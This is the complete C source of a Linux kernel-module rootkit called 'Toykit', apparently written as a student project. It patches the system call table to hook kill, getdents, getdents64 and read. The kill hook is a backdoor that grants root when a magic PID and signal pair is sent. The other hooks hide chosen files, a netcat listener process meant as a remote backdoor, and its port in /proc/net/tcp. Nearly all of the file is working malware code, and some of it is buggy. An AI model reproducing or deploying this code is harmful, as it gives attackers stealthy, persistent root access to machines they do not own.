#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>

// TODO 
// Better proc hiding
// Cite sources and write report
// Bug fix in getdents

// for local backdoor
#define LOCAL_PID 12345
#define LOCAL_SIG 31

// for controlling the file hider
#define HIDE_SIG 16

// for process hiding
#define HIDE_PROC "nc -l 1234" // for remote backdoor

// for port hiding
#define HIDE_PORT "04D2" // 1234 for hex

// for writing to sys_call_table
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

unsigned long *sys_call_table = (unsigned long*) 0xc15b0000;  // hard coded, grep /boot/System.map

// for hijacking sys_kill
typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
kill_ptr orig_kill;

static LIST_HEAD(hidden_files); // list of inodes to hide

struct hidden_file { // struct for list of inodes
	unsigned long long inode;
	struct list_head list;
};

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;
	struct hidden_file *toAdd;

	// kill backdoor
	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
		struct cred *cred;
		cred = (struct cred *) __task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		return 0;
	}
	// file hiding, pid = inode of file to be hidden
	else if (sig == HIDE_SIG) { 
		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
		toAdd->inode = (unsigned long long) pid;
		INIT_LIST_HEAD(&toAdd->list);
		list_add_tail(&toAdd->list,&hidden_files);
		return 0;
	}

	actual_result = (*orig_kill)(pid,sig);
	return actual_result;
}

// for getting a filename from a fd
void getPathnameFromFD(unsigned int fd, char *pathname, char *buf)
{
	struct files_struct *current_files; 
	struct fdtable *files_table;
	struct path file_path;

	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,buf,256*sizeof(char));
}

// for checking a process name against HIDE_PROC
int checkProcName(long pid)
{
	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
		return 1;
	return 0;
}

// for hijacking sys_getdents
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp,
                                       unsigned int count);
getdents_ptr orig_getdents;

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                               unsigned int count)
{
	int result, bp;
	struct hidden_file *ptr;
	char *kdirp; // char buffer so we can do pointer arithmetic by byte
	struct linux_dirent *d;

	// run real getdents 
	result = (*orig_getdents)(fd,dirp,count);
	if (result <= 0)
		return result;

	// copy from user to kernelspace;
	if (!access_ok(VERIFY_READ,dirp,result))
		return -1;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return -1;
	if (copy_from_user(kdirp,dirp,result))
		return -1;

	// check result for files to hide
	for (bp = 0; bp < result;) {
		d = (struct linux_dirent *) (kdirp + bp);
		list_for_each_entry(ptr,&hidden_files,list) {
			if (d->d_ino == ptr->inode) {
				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
					result - bp - d->d_reclen);
				result -= d->d_reclen;
				bp -= d->d_reclen;
			}
		}
		bp += d->d_reclen;
	}

	// copy from kernel to userspace
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return -1;
	if (copy_to_user(dirp,kdirp,result))
		return -1;
	kfree(kdirp);

	// return number of bytes read
	return result;
}

typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp,
                                         unsigned int count);
getdents64_ptr orig_getdents64;

asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                 unsigned int count)
{
	int result, bp;
	struct hidden_file *ptr;
	char *kdirp; // char buffer so we can do pointer arithmetic by byte
	struct linux_dirent64 *d;

	struct files_struct *current_files; 
	struct fdtable *files_table;
	struct path file_path;
	char pbuf[256], *pathname = NULL;
	long *pid = NULL;

	// run real getdents64 
	result = (*orig_getdents64)(fd,dirp,count);
	if (result <= 0)
		return result;

	// get pathname
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256*sizeof(char));

	// copy from user to kernelspace;
	if (!access_ok(VERIFY_READ,dirp,result))
		return -1;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return -1;
	if (copy_from_user(kdirp,dirp,result))
		return -1;

	// check dirp for "files" to hide
	for (bp = 0; bp < result;) {
		d = (struct linux_dirent64 *) (kdirp + bp);
		// process hiding
		if (!strcmp(pathname,"/proc")) {
			printk(KERN_INFO "After /proc check,%i\n",strlen(pathname));
			kstrtol(d->d_name,10,pid);
			printk(KERN_INFO "After pid convert,%li\n",*pid);
			if (checkProcName(*pid)) {
				printk(KERN_INFO "Found pid to hide\n");
				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
					result - bp - d->d_reclen);
				result -= d->d_reclen;
				bp -= d->d_reclen;
			}
		}
		// file hiding
		else {
			list_for_each_entry(ptr,&hidden_files,list) {
				if (d->d_ino == ptr->inode) {
					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
						result - bp - d->d_reclen);
					result -= d->d_reclen;
					bp -= d->d_reclen;
				}
			}
		}
		bp += d->d_reclen;
	}

	// copy from kernel to userspace
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return -1;
	if (copy_to_user(dirp,kdirp,result))
		return -1;
	kfree(kdirp);

	// return number of bytes read
	return result;
}

typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
                                    size_t count);
read_ptr orig_read;

asmlinkage long hacked_read(unsigned int fd, char __user *buf,
                            size_t count)
{
	long result, bp, diff_in_bytes;
	char *kbuf, *start_line, *end_line, *port_num;
	char *pathname, pbuf[256];
	struct files_struct *current_files; 
	struct fdtable *files_table;
	struct path file_path;

	// run real read 
	result = (*orig_read)(fd,buf,count);
	if (result <= 0)
		return result;

	// get pathname
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256*sizeof(char));

	// if virtual file /proc/net/tcp
	if (!strncmp(pathname,"/proc/",6) && !strcmp(pathname+10,"/net/tcp")) {
		// copy from user to kernelspace;
		if (!access_ok(VERIFY_READ,buf,result))
			return -1;
		if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
			return -1;
		if (copy_from_user(kbuf,buf,result))
			return -1;

		// filter out hidden ports
		start_line = strchr(kbuf,':') - 4;
		diff_in_bytes = (start_line - kbuf) * sizeof(char);
		for (bp = diff_in_bytes; bp < result; bp += diff_in_bytes) {
			start_line = kbuf + bp;
			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
			end_line = strchr(start_line,'\n');
			diff_in_bytes = ((end_line - start_line) + 1) * sizeof(char);
			if (!strncmp(port_num,HIDE_PORT,4)) {
				memmove(start_line,end_line + 1,
					result - bp - diff_in_bytes);
				result -= diff_in_bytes;
			}
		}

		// copy from kernel to userspace
		if (!access_ok(VERIFY_WRITE,buf,result))
			return -1;
		if (copy_to_user(buf,kbuf,result))
			return -1;
		kfree(kbuf);
	}


	// return number of bytes read
	return result;
}

int rootkit_init(void) {
	GPF_DISABLE;
	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;

	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;

	orig_read = (read_ptr)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long) hacked_read;
	GPF_ENABLE;

	printk(KERN_INFO "Loading rootkit\n");
    	return 0;
}

void rootkit_exit(void) {
	struct hidden_file *ptr, *next;

	GPF_DISABLE;
	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	sys_call_table[__NR_read] = (unsigned long) orig_read;
	GPF_ENABLE;

	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
		list_del(&ptr->list);
		kfree(ptr);
	}
	printk(KERN_INFO "Removing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Toykit");
MODULE_AUTHOR("Josh Imhoff");
